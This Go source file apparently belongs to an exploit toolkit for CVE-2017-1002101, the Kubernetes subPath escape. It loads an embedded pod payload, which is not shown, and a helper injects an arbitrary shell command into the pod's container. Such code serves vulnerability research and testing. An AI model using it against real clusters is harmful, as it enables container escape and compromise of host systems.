package CVE_2017_1002101

import (
	"bytes"
	_ "embed"
	"fmt"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	apiv1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/util/yaml"
)

//go:embed payload.yaml
var payloadYaml []byte
var payload apiv1.Pod

func init() {
	dec := yaml.NewYAMLOrJSONDecoder(bytes.NewReader(payloadYaml), len(payloadYaml))
	awesome_error.CheckFatal(dec.Decode(&payload))
}

func updatePayloadCommand(shCommand string) {
	payload.Spec.Containers[0].Command = []string{"/bin/sh", "-c", fmt.Sprintf("%s;sleep 999999", shCommand)}
}
